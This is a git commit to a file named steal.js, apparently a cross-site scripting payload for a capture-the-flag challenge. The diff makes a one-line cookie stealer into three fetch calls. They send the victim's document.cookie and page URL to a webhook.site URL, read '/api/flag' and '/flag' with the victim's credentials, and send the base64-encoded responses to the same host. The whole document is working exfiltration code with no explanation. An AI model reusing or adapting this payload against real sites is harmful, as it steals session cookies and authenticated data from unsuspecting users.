a3dc2aafcb6e2fa858b03900f5e0173b725b29c4
Prathiba Devi V S <151918953+PratibhaDevi29@users.noreply.github.com>
2026-04-05 14:14:07 +0530

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,1 +1,3 @@
-fetch('https://webhook.site/d7db9558-2e48-44de-9c35-49bf0ea2b0a1?c=' + document.cookie);
+fetch('https://webhook.site/d7db9558-2e48-44de-9c35-49bf0ea2b0a1?c='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href));
+fetch('/api/flag',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://webhook.site/d7db9558-2e48-44de-9c35-49bf0ea2b0a1?flag='+btoa(t)));
+fetch('/flag',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://webhook.site/d7db9558-2e48-44de-9c35-49bf0ea2b0a1?flag2='+btoa(t)));
